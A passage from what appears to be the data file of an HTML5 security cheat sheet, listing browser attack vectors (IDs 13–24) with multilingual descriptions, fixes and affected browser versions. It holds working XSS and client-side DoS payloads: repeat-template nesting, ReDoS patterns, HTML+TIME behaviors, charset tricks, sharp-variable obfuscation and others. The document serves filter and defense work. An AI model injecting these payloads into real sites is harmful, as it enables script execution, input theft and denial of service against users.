            'ru' : 'Отказ в обслуживании со стороны клиента с помощью повторяющихся шаблонов',
            'cs' : 'DoS u klienta pomocí repeat templates',
            'de' : '',
            'tr' : 'repeat template\'leri ile istemci taraflı DoS',
            'zh' : '通过repeat templates DoS客户端'
        },
        'data'       : '<x repeat="template" repeat-start="999999">0<y repeat="template" repeat-start="999999">1</y></x>',
        'description': {
            'en' : 'This vector uses the repeat template syntax specifies in the WebForms 2.0 draft. By using nested tags repeating themselves all over again the client can be forced to deny service or even crash.',
            'ja' : '',
            'ru' : 'Этот вектор использует синтаксис повторящихся шаблонов, определенный в черновике WebForms 2.0. При использовании вложенных тегов повторения могут провоцировать отказ в обслуживании или даже аварийное завершение работы клиента.',
            'cs' : 'Tento útok využívá syntaxi opakovacích šablon, definovaných v draftu WebForms 2.0. Použitím vnořených tagů bude šablona generovat obsah znovu a znovu, dokud prohlížeč nezastaví běh nebo nespadne.',
            'de' : '',
            'tr' : 'Bu vektör WebForms 2.0 şablonunda yer alan repeat template yazımını kullanmaktadır. İç içe etiketlerin kendilerini istemci üzerinde tekrarlaması ile istemcinin servisi durdurması yada servisin çakılması sağlanabilir.',
            'zh' : '这个向量是使用WebForms 2.0草案中的repeat template规范.利用嵌套一遍一遍的repeat标签本身,使用客户端崩溃.'
        },
        'urls'    : ['http://www.whatwg.org/specs/web-forms/current-work/#repeatingFormControls'],
        'howtofix'   : {
            'en' : 'Avoid allowing users submitting HTML containing repeat or "repeat-start"/"repeat-end" attributes. If necessary validate the numerical values used for them to be reasonably small.',
            'ja' : '',
            'ru' : 'Не разрешайте пользовательскую HTML-разметку , содержащую атрибуты repeat или repeat-start/repeat-end. При необходимости проверяйте, чтобы используемые в них численные значения были относительно невелики.',
            'cs' : 'Nedovolte uživatelům vkládat HTML s atributy repeat-start nebo repeat-end. Pokud je to nutné, zkontrolujte, zda jsou použitá čísla rozumně malá.',
            'de' : '',
            'tr' : 'Kullanıcı tanımlı HTML kodlarının repeat veya "repeat-start"/"repeat-end" özelliklerini içermediğinden emin olunmalıdır. Gerekirse tekrarlama için kullanılan rakamlar denetlenmeli ve küçük rakamlar olduğundan emin olunmalıdır.',
            'zh' : '不要允许用户提交的HTML中包含repeat或repeat 或repeat-start、repeat-end属性.如果有这需求可以验证他们的值是否过大.'
        },            
        'browsers'   : {
            'opera': ['10.0', '10.10', 'end']
        },
        'tags'       : ['dos', 'repeat', 'template', 'webforms', 'opera', 'proprietary'],
        'reporter'   : '.mario'
    },
    { /* ID 14 - Client-side denial of service via faulty regular expressions */
        'id'         : 14,
        'category'   : 'dos', 
        'name'       : {
            'en' : 'Client-side denial of service via faulty regular expressions',
            'ja' : '',
            'ru' : 'Отказ в обслуживании со стороны клиента с помощью неправильного регулярного выражения',
            'cs' : 'DoS v prohlížeči pomocí chybného regulárního výrazu',
            'de' : '',
            'tr' : 'Bozuk düzenli ifadeler ile istemci taraflı DoS',
            'zh' : '通过恶意的正则表达式DoS客户端'
        },
        'data'       : '<input pattern=^((a+.)a)+$ value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!>',
        'description': {
            'en' : 'Opera 10 allows client side validation via the pattern attribute. In case the pattern value is a badly written regex the client can be "dossed" with short customized character sequences.',
            'ja' : '',
            'ru' : 'Opera 10 поддерживает проверку правильности пользовательского ввода с помощью атрибута pattern. В случае, если параметр pattern является ошибочно написанным регулярным выражением, это может вызвать отказ в обслуживании с клиентской стороны.',
            'cs' : 'Opera 10 dovoluje ověření na straně klienta pomocí regulárních výrazů v atributu pattern. Pokud je v tomto atributu zadán zákeřně zapsaný regulární výraz, lze tím klienta pomocí krátké znakové sekvence zatížit',
            'de' : '',
            'tr' : 'Opera 10 pattern özelliği ile istemci taraflı düzenli ifade denetimine izin vermekte. Bu durumda pattern değerine kötü bir regex yazılabilir ve istemci dos edilebilir.',
            'zh' : 'Opera 10 支持使用pattern属性进行验证,如果正则表达式写的有问题,那么可能会导致"dossed".'
        },
        'urls'    : ['http://www.whatwg.org/specs/web-apps/current-work/#the-pattern-attribute', 'http://en.wikipedia.org/wiki/Regular_expression_Denial_of_Service_-_ReDoS'],
        'howtofix'   : {
            'en' : 'Don\'t allow users to submit HTML containing "pattern" attributes and make sure your own client side regular expressions used for validation are well written and not vulnerable against easy ReDoS attacks.',
            'ja' : '',
            'ru' : 'Не разрешайте пользовательскую HTML-разметку , содержащую атрибут pattern и убедитесь, что ваши собственные клиентские регулярные выражения корректно написаны и неуязвимы для ReDoS атак.',
            'cs' : 'Nedovolte uživatelům vložit HTML s atributem "pattern" a ujistěte se, že vaše vlastní regulární výrazy použité pro validaci jsou robustní a nejsou náchylné k podobným DoS útokům.',
            'de' : '',
            'tr' : 'Kullanıcıların "pattern" özelliği içeren HTML sağlamalarına izin vermeyin ve istemci tarafında yazmış olduğunuz denetleme regex\'lerinin iyi yazıldığından, ReDoS zafiyeti içermediğinden emin olun.',
            'zh' : '不要允许用户提交的HTML中含有"pattern"属性,确保验证的正则写的没啥问题.'
        },            
        'browsers'   : {
            'opera': ['10.0']
        },
        'tags'       : ['dos', 'pattern', 'regex', 'html5', 'validation', 'opera', 'proprietary'],
        'reporter'   : '.mario'
    },
    { /* ID 15 - JavaScript execution via sharp variables */
        'id'         : 15,
        'category'   : 'javascript', 
        'name'       : {
            'en' : 'JavaScript execution via sharp variables',
            'ja' : '',
            'ru' : 'Выполнение JavaScript с помощью диез-переменных',
            'cs' : 'Vykonání JavaScriptu přes #proměnné',
            'de' : '',
            'tr' : 'Diyez\'ler ile JavaScript çalıştırma',
            'zh' : '使用sharp variables执行Javascript'
        },
        'data'       : '<script>({0:#0=%js_alert_only%/#0#/#0#(0)})</script>',
        'description': {
            'en' : 'This vector demonstrates how sharp variables and cyclic references can be used for obfuscation to hide the actual method execution.',
            'ja' : '',
            'ru' : 'Этот вектор демонстрирует использование диез-переменных (sharp variables) и циклических ссылок для обфускации фактического вызова метода.',
            'cs' : 'V ukázce jsou použity #proměnné a kruhové reference k zamaskování vykonávaného skriptu',
            'de' : '',
            'tr' : 'Bu vektör diyezler ve devirli referansların kullanımı ile asıl çalıştırlmak istenen kodun saklanması için nasıl anlaşılamaz hale getirilebileceğini göstermektedir.',
            'zh' : '这个向量展示了sharp variables和循环引用能用与做混淆和隐式执行代码'
        },
        'urls'    : ['https://developer.mozilla.org/en/Sharp_variables_in_JavaScript'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : '',
            'tr' : ''
        },          
        'browsers'   : {
            'firefox': ['2.x', '3.0', '4.0', '11.0', 'end']
        },
        'tags'       : ['xss', 'javascript', 'firefox', 'sharp', 'proprietary'],
        'reporter'   : '.mario'
    },
    { /* ID 16 - Using onbegin and HTML+TIME to execute JavaScript */
        'id'         : 16,
        'category'   : 'behavior', 
        'name'       : {
            'en' : 'Using onbegin and HTML+TIME to execute JavaScript',
            'ja' : '',
            'ru' : 'Использование onbegin и HTML+TIME для вызова JavaScript',
            'cs' : 'Použití onbegin a HTML+TIME k vykonání JavaScriptu',
            'de' : '',
            'tr' : 'onbegin ve HTML+TIME kullanarak JavaScript çalıştırma',
            'zh' : '使用HTML+TIME和onbegin执行Javascript'
        },
        'data'       : 'X<x style=`behavior:url(#default#time2)` onbegin=`%js_write%` >',
        'description': {
            'en' : 'The HTML+TIME behavior allows to use arbitrary tags to execute JavaScript via onbegin event handlers.',
            'ja' : '',
            'ru' : 'Поведение HTML+TIME позволяет достичь исполнения JavaScript в произвольном теге с помощью обработчика события onbegin.',
            'cs' : 'HTML+TIME umožňuje běžnému tagu vyvolat JavaScript pomocí obsluhy události begin',
            'de' : '',
            'tr' : 'HTML+TIME behavior özelliği kullanılarak ve onbegin olay yakalayıcısı ile JavaScript çalıştırılabilmektedir.',
            'zh' : '使用HTML+TIME behavior可以使任意标签处理onbegin事件.'
        },
        'urls'    : ['http://msdn.microsoft.com/en-us/library/ms533102%28VS.85%29.aspx'],
        'howtofix'   : {
            'en' : 'Don\'t allow behavior properties in user submitted CSS and markup and don\'t rely on blacklists regarding dangerous HTML tags. The rather unknown HTML+TIME API provides too many ways to execute JavaScript with and without user interaction on exotic ways. Avoid blacklists if possible.',
            'ja' : '',
            'ru' : 'Не позволяйте свойства поведений в пользовательских стилях и разметке и не полагайтесь на черные списки в отношении опасных HTML-тегов. Достаточно нераспространенные HTML+TIME API предоставляют слишком много экзотических способов исполнения JavaScript без взаимодействия с пользователем. Избегайте черных списков, если это возможно.',
            'cs' : 'Nedovolte vlastnost "behavior" v uživatelském CSS či HTML. Poměrně neznámé API HTML+TIME nabízí velmi mnoho způsobů, jak vykonat skript, ať už s uživatelskou interakcí či bez ní.',
            'de' : '',
            'tr' : 'Kullanıcı tanımlı CSS\'lerde behavior özelliğine izin vermeyin ve tehlikeli HTML taglarına karşı kullanılan kara listelere güvenmeyin. Daha doğrusu HTML+TIME API\'si kullanıcı etkileşimi gerektiren veya gerektirmeyen birçok farklı yoldan JavaScript çalıştırılabilmesini sağlar. Mümkünse kara listelerden kaçının.',
            'zh' : '不允许用户在提交的标签或CSS中含有behavior属性,HTML+TIME API提供了很多方法来执行Javascript,如果有可能,不用使用黑名单的方式处理HTML危险标签.'
        },            
        'browsers'   : {
            'internet explorer': ['5.5', '6.0', '7.0', '8.0', 'end']
        },
        'tags'       : ['xss', 'javascript', 'ie', 'behavior', 'html+time', 'onbegin'],
        'reporter'   : '.mario'
    },
    { /* ID 17 - Opera XML-stylesheets executing JavaScript */
        'id'         : 17,
        'category'   : 'xml', 
        'name'       : {
            'en' : 'Opera XML-stylesheets executing JavaScript',
            'ja' : '',
            'ru' : 'Исполнение JavaScript с помощью XML-таблицы стилей в Opera ',
            'cs' : 'XML stylesheet vykoná JavaScript v Opeře',
            'de' : '',
            'tr' : 'Opera XML-stylesheets ile JavaScript çalıştırma',
            'zh' : '通过Opera XML-stylesheets执行JavaScript'
        },
        'data'       : '<?xml-stylesheet href="%js_uri_alert%"?><root/>',
        'description': {
            'en' : 'Opera 9.x and 10.0 allow to apply XML-stylesheets with JavaScript URIs and. The vectors even works if the page is delivered as text/html.',
            'ja' : '',
            'ru' : 'Opera 9.x и 10,0 позволяет применять XML-таблицы стилей с псевдоскриптом, который в дальнейшем выполняется без взаимодействия с пользователем. Вектор работает, даже если страница отправляется как text/html.',
            'cs' : 'Opera 9.x a 10.0 umožňuje použít XML stylesheets s JavaScriptovými URI a vykonat tak JavaScript bez uživatelské interakce. Útok funguje i pokud je stránka poslána jako text/html.',
            'de' : '',
            'tr' : 'Opera 9.x ve 10.0 JavaScript URI\'leri ile XML stylesheets uygulanmasına izin vermektedir ve kullanıcı etkileşimi gerektirmeden JavaScript çalıştırmaktadır. Bu vektör sadece sayfa text/html olarak sunulmuşsa çalışır.',
            'zh' : 'Opera 9.x和10.0允许XML-stylesheets使用Javascript URI.这个向量在mime-type是text/html的情况下是也有效的.'
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'Make sure that user input cannot contain XML stylesheets or tags not consisting of <\\w+ - because this vector would only be matched via <\\?\\w+ but still executes JavaScript without user interaction. Avoid blacklists is possible.',
            'ja' : '',
            'ru' : 'Убедитесь, что пользовательская разметка не может содержать XML-таблицы и теги, не состоящие из <\\w+ - потому что этот вектор будет соответствовать только <\\?\\w+ . Избегайте черных списков, если это возможно.',
            'cs' : 'Ujistěte se, že uživatel nesmí vložít XML stylesheet nebo tagy, které neodpovídají <\\w+. Tento druh útoku může být identifikován jen podle <\\?\\w+',
            'de' : '',
            'tr' : 'Kullanıcı girdisinin XML stylesheets içermediğinden veya tagların <\\w+ şeklinde oluşmadığından emin olun - çünkü bu vektör sadece <\\?\\w+ ile eşleşir ama yine kullanıcı etkiletişimi olmadan JavaScript çalıştırır. Kara listelerden kaçının.',
            'zh' : '确保用户输入的没有包含XML stylesheets或者只允许能被<\\w+匹配的标签 - 因为这个向量需要<\\?\\w+才能匹配.黑名单是有可能被绕过的.'
        },            
        'browsers'   : {
            'opera': ['9.x', '10.0', '10.10', 'end', 'mobile']
        },
        'tags'       : ['xss', 'javascript', 'opera', 'xml', 'css', 'proprietary'],
        'reporter'   : '.mario'
    },
    { /* ID 18 - Entities inside <SCRIPT> and comparable tags */
        'id'         : 18,
        'category'   : 'xml', 
        'name'       : {
            'en' : 'Entities inside <SCRIPT> and comparable tags',
            'ja' : '',
            'ru' : 'HTML-эквиваленты внутри <SCRIPT> и аналогичных тегов',
            'cs' : 'Entity v tagu SCRIPT a podobných',
            'de' : '',
            'tr' : '',
            'zh' : '<SCRIPT>和其它类似标签内的Entities'
        },
        'data'       : '<script xmlns="http://www.w3.org/1999/xhtml">%js_alert_entities%</script>',
        'description': {
            'en' : 'By specification user agents allow using HTML entities between <SCRIPT> and <STYLE> tags in case the document is being delivered and rendered as X(HT)ML.',
            'ja' : '',
            'ru' : 'Согласно спецификации пользовательским агентам разрешено распознавать HTML-эквиваленты внутри тегов <SCRIPT> и <STYLE> в случае, если документ отдается и обрабатывается как X(HT)ML.',
            'cs' : 'Podle specifikace smí být v případě, že dokument je poslán jako X(HT)ML, vloženy do elementů SCRIPT a STYLE HTML entity.',
            'de' : '',
            'tr' : '',
            'zh' : ''
        },
        'urls'    : [],
        'howtofix'   : {
            'en' : 'Make sure filters and detection systems consider the fact of having entities to be allowed inbetween <SCRIPT>, <STYLE> and other tags - and not only in attributes.',
            'ja' : '',
            'ru' : 'Убедитесь, что фильтры и системы обнаружения учитывают возможность наличия HTML-эквивалентов внутри тегов <SCRIPT>, <STYLE> и других, а не только в атрибутах.',
            'cs' : 'Ujistěte se, že vaše filtry a detektory průniku respektují fakt, že SCRIPT, STYLE a další tagy mohou obsahovat entity.',
            'de' : '',
            'tr' : '',
            'zh' : '确保过滤器或其它检测系统考虑了<script>或<style>和其它标签之间允许有Entities的事实.而不仅仅是属性.'
        },            
        'browsers'   : {
            'opera': ['8.x', '9.0', '10.0', '11.0', '12.0'], 
            'firefox' : ['1.x', '2.0', '3.0', '4.0', '15.0'], 
            'chrome': ['3.0', '4.0', '5.0', '6.0', '7.0', '8.0', '9.0', '10.0', '23.0'],
			      'safari' : ['5.0', '5.1.7'],
			      'internet explorer': ['9.0']
        },
        'tags'       : ['xss', 'javascript', 'opera', 'internet explorer', 'firefox', 'chrome', 'safari', 'xml', 'entity'],
        'reporter'   : '.mario'
    },
    { /* ID 19 - XSS via &#188 and &#190 in MacFarsi, MacArabic and MacHebrew */
        'id'         : 19,
        'category'   : 'charset', 
        'name'       : {
            'en' : 'XSS via &#188 and &#190 in MacFarsi, MacArabic and MacHebrew',
            'ja' : '',
            'ru' : 'XSS c использованием &#188 and &#190 в кодировках MacFarsi, MacArabic and MacHebrew',
            'cs' : 'XSS via &#188 a &#190 v MacFarsi, MacArabic a MacHebrew',
            'de' : '',
            'tr' : 'MacFarsi, MacArabic ve MacHebrew karakter kodlamalarında, &#188 ve &#190 ile XSS',
            'zh' : ''
        },
        'data'       : '<meta charset="x-mac-farsi">\xBCscript \xBE%js_alert%//\xBC/script \xBE',
        'description': {
            'en' : 'Buggy charset implementations in Firefox allow to craft HTML structures without using the usual characters such as < and >. Most affected charsets are from the Mac charset family - such as mac-farsi, mac-arabic and mac-hebrew.',
            'ja' : '',
            'ru' : 'Ошибочная реализация кодировок в Firefox позволяет создавать HTML-структуры без использования привычных символов, таких как "<" и ">". Несколько подверженных кодировок из семейства Mac - mac-farsi, mac-arabic и mac-hebrew.',
            'cs' : 'Chybná implementace znaků ve Firefoxu umožňuje vutvářet HTML struktury bez obvyklých znaků < a >. Většina ovlivněných znakových sad je z rodiny Mac - jako mac-farsi, mac-arabic a mac-hebrew.',
            'de' : '',
            'tr' : 'Hatalı karakter seti uyarlamaları Firefox\'ta HTML yapısını < ve > karakterlerini kullanmadan bozmaya yaramaktadır. Mac karakter seti ailesindeki birçok karakter seti etkilenmektedir - mac-farsi, mac-arabic ve mac-hebrew gibi. '
        },
        'urls'    : ['https://twitter.com/#!/hasegawayosuke/status/25984750035'],
        'howtofix'   : {
            'en' : 'User input should never allow <META> tags to avoid re-setting the charset. In case the website is encoded in one of the affected charsets make sure to have your filter be aware that for Firefox &#60; (<) and &#188; are equivalent - as well as other characters too.',
            'ja' : '',
            'ru' : 'Пользовательскому вводу никогда не должен быть разрешен тег <МЕТА> во избежание переопределения кодировки. В случае, если веб-сайт кодируется в одной из указанных кодировок, убедитесь, что вашему фильтру известно, что для Firefox символы &#60; (<) и &#188; эквивалентны, аналогично и в отношении других сиволов.',
            'cs' : 'Data od uživatele nesmí nikdy obsahovat META tag, kterým by mohl přenastavit kódování. Pokud je web nakódován v jedné z výše uvedených znakových sad, tak se ujistěte, že je vašemu filtru známo, že Firefox bere znaky &#60; (<) a &#188; jako totožné',
            'de' : '',
            'tr' : 'Kullanıcı girdisinde asla <META> taglarına karakter setlerinin tekrar ayarlarlanmalarını sağlaması için izin verilmemelidir. Bu durumda etkilenen karakter setleri ile çözümleme yapan web sitelerinin filtreleri Firefox için geçerli olan bu durumdan haberdar olmalıdır - &#60; (<) ve &#188; denktir. - aynı zamanda diğer karakterlerde.'
        },            
        'browsers'   : {
            'firefox' : ['2.x', '3.0', '3.5', '3.6', '3.6.28', 'end']
        },
        'tags'       : ['x-mac-arabic', 'x-mac-farsi', 'x-mac-hebrew', 'firefox', 'charset'],
        'reporter'   : 'hasegawayosuke'
    },
    { /* ID 20 - JavaScript execution via overwritten ReferenceError object */
        'id'         : 20,
        'category'   : 'javascript', 
        'name'       : {
            'en' : 'JavaScript execution via overwritten ReferenceError object',
            'ja' : '',
            'ru' : 'Исполнение JavaScript через переопределение объекта ReferenceError',
            'cs' : 'Vykonání JavaScriptu pomocí přepsaného objektu ReferenceError',
            'de' : '',
            'tr' : 'Üstüne yazılmış ReferenceError objesi ile JavaScript çalıştırma',
            'zh' : '通过覆盖ReferenceError对象执行Javascript'
        },
        'data'       : '<script>ReferenceError.prototype.__defineGetter__(\'name\', function(){%js_alert%}),x</script>',
        'description': {
            'en' : 'This JavaScript vector shows how overwriting the ReferenceError object and causing the exact same kind of error afterwards can lead to JavaScript execution. This is of course the same for most other error objects and should be taken into consideration when implementing JavaScript sandboxes or comparable.',
            'ja' : '',
            'ru' : 'Этот JavaScript-вектор показывает, как переопределяя объект ReferenceError и вызывая такого же рода ошибку впоследствии, можно вызвать выполнение JavaScript. Это, разумеется, действительно для большинства других объектов ошибкок и должнo приниматься во внимание при разработке JavaScript-песочниц и т.п.',
            'cs' : 'Tento JavaScriptový útok ukazuje, jak lze vyvolat vykonání JavaScriptu pomocí přepsání objektu ReferenceError a vyvolání takové chyby. Totéž platí analogicky pro většinu ostatních chybových objektů a je třeba na to dát pozor, pokud implementujete JS sandboxy či podobné techniky.',
            'de' : '',
            'tr' : 'Bu JavaScript vektörü ReferenceError objesinin nasıl üstüne yazılacağını ve benzer şekilde ki bir hata ile JavaScript çalıştırılabileceğini göstermektedir. Diğer hata objeleri içinde geçerli olmakla beraber JavaScript sandbox\'ları uygulanırken göz önüne alınmalıdır.',
            'zh' : '这个Javascript向量展示了如何覆盖ReferenceError对象,并引起错误,从而导致Javascript执行.'
        },
        'urls'    : ['https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Functions/ReferenceError'],
        'howtofix'   : {
            'en' : 'Do not trust the DOM in case the user can influence it via script injections, includes or other DOM based property access.',
            'ja' : '',
            'ru' : 'Не доверяйте DOM в случае, если пользователь может повлиять на неё через инъекции, включения JavaScript или другой доступ к свойствам, основанный на DOM.',
            'cs' : 'Nedůvěřujte DOMu v případě, že jej uživatel může ovlivnit vložením skriptu nebo jiným způsobem přístupu skrz DOM',
            'de' : '',
            'tr' : 'Kullanıcı betik enjekte ederek, dahil ederek veya diğer DOM tabanlı özelliklere erişerek DOM\'u etkilendiğinde sakın DOM\'a güvenmeyin.',
            'zh' : '在用户可以注入脚本的情况下不要相信DOM,即便是DOM属性的访问.'
        },            
        'browsers'   : {
            'opera': ['8.x', '9.0', '10.0', '11.0', '11.01', 'end'], 
            'firefox' : ['1.x', '2.0', '3.0', '4.0', '15.0'], 
            'chrome': ['3.0', '4.0', '5.0', '6.0', '7.0', '9.0', 'end'],
            'safari': ['4.0', '5.0', '5.1.7']
        },
        'tags'       : ['javascript', 'opera', 'firefox', 'chrome', 'safari', 'ReferenceError', 'overwrite'],
        'reporter'   : '.mario'
    },
    { /* ID 21 - JavaScript execution via proprietary __noSuchMethod__  */
        'id'         : 21,
        'category'   : 'javascript', 
        'name'       : {
            'en' : 'JavaScript execution via proprietary __noSuchMethod__',
            'ja' : '',
            'ru' : 'Выполнение JavaScript с помощью нестандарного свойства __noSuchMethod__',
            'cs' : 'Vykonání JavaScriptu proprietární metodou __noSuchMethod__',
            'de' : '',
            'tr' : '__noSuchMethod__ özelliği ile JavaScript çalıştırma',
            'zh' : '通过私有属性 __noSuchMethod__执行Javascript'
        },
        'data'       : '<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._(\'%js_alert%\')()</script>',
        'description': {
            'en' : 'Firefox supports the non-standard __noSuchMethod__ property which will be used as an interceptor as soon as a non existing object method is being called. It can be assigned with the Function object to force JavaScript execution without using function(){...}.',
            'ja' : '',
            'ru' : 'Firefox поддерживает нестандартное свойство __noSuchMethod__ , которое может использоваться в качестве перехватчика, когда вызывается несуществующий объект. В качестве такового может быть назначен объект Function, чтобы инициировать исполнение JavaScript без использовавания function(){...} .',
            'cs' : 'Firefox podporuje nestandardní metodu __noSuchMethod__, která může být využita jako spouštěcí ve chvíli, kdy je zavolána neexistující metoda objektu. Může jí být přiřazen objekt Function, čímž se útočník vyhne použití function(){...}.',
            'de' : '',
            'tr' : 'Firefox standart dışı __noSuchMethod__ özelliğini desteklemektedir ki bu özellik mevcut olmayan obje methodu çağırıldığında engellemek için kullanılır. Function objesiyle ilişkilendirilerek function(){...} kullanmadan JavaScript çalıştırılmasını sağlar.',
            'zh' : 'Firefox支持非标准的属性 __noSuchMethod__ ,它可以使我们在访问一个对象不存在的方法时自动拦截.我们可以利用它执行Javascript而不需要使用funtion(){...}这样的方法.'
        },
        'urls'    : ['https://developer.mozilla.org/en/Core_JavaScript_1.5_Reference/Global_Objects/Object/noSuchMethod'],
        'howtofix'   : {
            'en' : '',
            'ja' : '',
            'ru' : '',
            'cs' : '',
            'de' : '',
            'tr' : ''
        },          
        'browsers'   : {
            'firefox' : ['3.5', '3.6', '4.0', '15.0'] 
        },
        'tags'       : ['xss', 'javascript', 'firefox', '__noSuchMethod__', 'proprietary'],
        'reporter'   : 'Gareth, .mario'
    },
    { /* ID 22 - Input stealing/form DoS with onblur=focus() and autofocus  */
        'id'         : 22,
        'category'   : 'dos', 
        'name'       : {
            'en' : 'Input stealing/form DoS with onblur=focus() and autofocus',
            'ja' : '',
            'ru' : 'Перехват ввода/DoS формы посредством onblur=focus() и autofocus',
            'cs' : 'DoS útok proti formuláři pomocí onblur=focus() a autofocus',
            'de' : '',
            'tr' : 'onblue=focus() ve autofocus ile girdi çalma/form DoS'
        },
        'data'       : '<input onblur=%js_focus% autofocus><input>',
        'description': {
            'en' : 'This very basic vector demonstrates how the combination of "autofocus" and "onblur" can render any other form on the targeted website useless.',
            'ja' : '',
            'ru' : 'Этот очень простой вектор показывает, как сочетание autofocus и onblur может сделать любую другую форму на целевом сайте бесполезной.',
            'cs' : 'Tento jednoduchý útok ukazuje, jak kombinace "autofocus" a "onblur" může snadno udělat formulář nepoužitelným.',
            'de' : '',
            'tr' : 'Bu çok basit vektör "autofocus" ve "onblur"\'un kombinasyonunun nasıl hedef site üzerindeki diğer formları kullanışsız hale getirebileceğini göstermektedir.'
        },
        'urls'    : ['http://www.w3.org/Bugs/Public/show_bug.cgi?id=9602'],
        'howtofix'   : {
            'en' : 'User submitted markup should not contain "autofocus" attributes.',
            'ja' : '',
            'ru' : 'Пользовательская разметка не должна содержать атрибут autofocus.',
            'cs' : 'Uživatelem zadávaný HTML kód by neměl obsahovat atribut "autofocus".',
            'de' : '',
            'tr' : 'Kullanıcı tanımlı markup\'lar "autofocus" özelliğini içermemelidir.'
        },            
        'browsers'   : {
            'opera': ['9.0', '10.0', '11.0', '12.0'], 
            'chrome': ['3.0', '4.0', '5.0', '6.0', '7.0', '8.0', '9.0', '10.0', '23.0'],
            'safari' : ['5.0', '5.1.7']
        },
        'tags'       : ['dos', 'javascript', 'opera', 'chrome', 'safari', 'autofocus', 'onblur', 'html5'],
        'reporter'   : 'Skyphire, Gareth, .mario'
    },
    { /* ID 23 - Form surveillance with onformchange, onforminput and form attributes  */
        'id'         : 23,
        'category'   : 'html5', 
        'name'       : {
            'en' : 'Form surveillance with onformchange, onforminput and form attributes',
            'ja' : '',
            'ru' : 'Наблюдение за формой с помощью атрибутов onformchange, onforminput и form',
            'cs' : 'Sledování formuláře pomocí atributů onformchange, onforminput a form',
            'de' : '',
            'tr' : 'onformchange, onforminput ve form özellikleri ile form gözetimi'
        },
        'data'       : '<form id=test onforminput=%js_alert%><input></form><button form=test onformchange=%js_alert_2%>X</button>',
        'trigger'    : 'document.forms.test.elements[1].onformchange();document.forms.test.onforminput()',
        'description': {
            'en' : 'Enter a value into the form element to see how "onforminput" and "onformchange" attributes can monitor <FORM> activity - even from outside the <FORM> via the form attribute on a <BUTTON> element.',
            'ja' : '',
            'ru' : 'Введите значение в поле ввода, чтобы увидеть, как атрибуты onforminput и onformchange могут контролировать активность в теге <FORM> даже за пределами этого тега с помощью атрибута form тега <button> .',
            'cs' : 'Pomocí atributů "onforminput" a "onformchange" lze monitorovat aktivitu ve formuláři - a to i dokonce mimo formulář, pomocí svázání atributem "form" u elementu BUTTON.',
            'de' : '',
            'tr' : '"onforminput" ve "onformchange" özelliklerinin <FORM> hareketlerini nasıl gözlediklerini görebilmek için form elemanına bir değer giriniz - hatta <FORM> dışında <BUTTON> elemanının form özelliği ile.'
        },
        'urls'    : ['http://www.whatwg.org/specs/web-apps/current-work/multipage/association-of-controls-and-forms.html#broadcast-formchange-events'],
        'howtofix'   : {
            'en' : 'Make sure users cannot submit markup including the form, "onformchange" and "onforminput" attributes. Do not apply <FORM> elements with an "id" attribute.',
            'ja' : '',
            'ru' : 'Убедитесь, что пользовательский ввод не может содержать атрибуты onformchange, onforminput и form. Избегайте атрибут id в теге <FORM>.',
            'cs' : 'Ujistěte se, že uživatel nevloží HTML kód s atributy form, onformchange a onforminput. Nedávejte elementu FORM atribut "id".',
            'de' : '',
            'tr' : 'Kullanıcıların form, "onformchange" ve "onforminput" dahil herhangi bir markup sağlamadığından emin olun. <FORM> elemanlarına "id" özelliği uygulamayın.'
        },                        
        'browsers'   : {
            'opera' : ['10.5', '11.0', '12.0', 'mobile'] 
        },
        'tags'       : ['surveillance', 'javascript', 'opera', 'html5', 'onforminput', 'onformchange'],
        'reporter'   : 'Skyphire, .mario'
    },
    { /* ID 24 - JavaScript execution via HTML+TIME without user interaction (1) */
        'id'         : 24,
        'category'   : 'behavior', 
        'name'       : {
            'en' : 'JavaScript execution via HTML+TIME without user interaction (1)',
            'ja' : '',
            'ru' : 'Активный скриптинг с применением технологии HTML+TIME (1)',
            'cs' : 'Vykonání JavaScriptu via HTML+TIME bez uživatelské interakce (1)',
            'de' : '',
            'tr' : 'Kullanıcı etkileşimi gerektirmeden HTML+TIME ile JavaScript çalıştırma (1)'
        },
        'data'       : '1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=%js_alert%&gt;`>',
        'description': {
            'en' : 'This obfuscated vector uses HTML+TIME to execute JavaScript without user interaction - and without suspicious event handlers but just "attributename" and "to" attributes.',
            'ja' : '',
            'ru' : 'Этот слегка обфусцированный вектор использует HTML+TIME для исполнения JavaScript без взаимодействия с пользователем и без подозрительных обработчиков событий исключительно с помощью атрибутов attributename и to. ',
            'cs' : 'Tento lehce zamaskovaný útok používá HTML+TIME k vyvolání JavaScriptu bez zásahu uživatele - a také bez podezřelých obsluh událostí, pouze s atributy "attributename" a "to"',
            'de' : '',
            'tr' : 'Yakalanmayacak şekilde oluşturulmuş bu vektör kullanıcı etkileşimi gerektirmeden HTML+TIME kullanarak JavaScript çalıştırmaktadır - ve şüpheli olmayan olay yakalayıcıları olmadan "attributename" ve "to" hariç'
        },
        'urls'    : ['http://msdn.microsoft.com/en-us/library/ms533102%28VS.85%29.aspx'],
        'howtofix'   : {
            'en' : 'Don\'t allow behavior properties in user submitted CSS and markup and don\'t rely on blacklists regarding dangerous HTML tags. The rather unknown HTML+TIME API provides too many ways to execute JavaScript with and without user interaction on exotic ways. Avoid blacklists if possible.',
            'ja' : '',
            'ru' : 'Не разрешайте свойства поведений в пользовательских стилях и разметке и не полагайтесь на черные списки в отношении опасных HTML-тегов. Малоизвестные HTML+TIME API предоставляют довольно много экзотических способов исполнения JavaScript, в т.ч. без взаимодействия с пользователем. Избегайте черных списков, если это возможно.',
            'cs' : 'Nepovolte vlastnost "behavior" v uživatelsky vkládaném CSS a HTML a nespoléhejte na blacklisty nebezpečných HTML tagů. Poměrně neznámé API HTML+TIME nabízí velmi mnoho způsobů, jak vykonat skript, ať už s uživatelskou interakcí či bez ní. Použití blacklistů se vyhněte, jak jen to je možné.',
            'de' : '',
            'tr' : 'Kullanıcı destekli CSS ve "markup"larda "behavior" özelliklerine izin vermeyin ve söz konusu tehlikeli HTML etiketleri için "blacklist"lere güvenmeyin. Çok bilinmeyen HTML+TIME API\'si Javascript çalıştırmak için kullanıcı etkileşimi gerektiren veya gerektirmeyen birçok egzotik yöntem sağlamaktadır. Mümkün olduğunca blacklist kullanımından kaçının.'
        },            
        'browsers'   : {
